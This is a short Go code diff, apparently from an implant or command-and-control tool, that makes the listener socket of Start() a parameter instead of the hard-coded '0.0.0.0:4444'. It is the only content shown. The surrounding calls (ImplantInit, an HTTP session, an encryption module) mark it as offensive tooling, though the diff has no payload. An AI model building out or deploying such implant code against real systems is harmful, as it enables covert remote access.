@@ -11,11 +11,11 @@ import (
 	"time"
 )
 
-func Start() {
+func Start(sock string) {
 	i := ImplantInit()
 
 	h := HTTPNew(i.SessionID)
-	h.HTTPSetSocket("0.0.0.0:4444")
+	h.HTTPSetSocket(sock)
 	h.HTTPSetURL(false, "/")
 
 	enc := encrypt.EncryptInit()
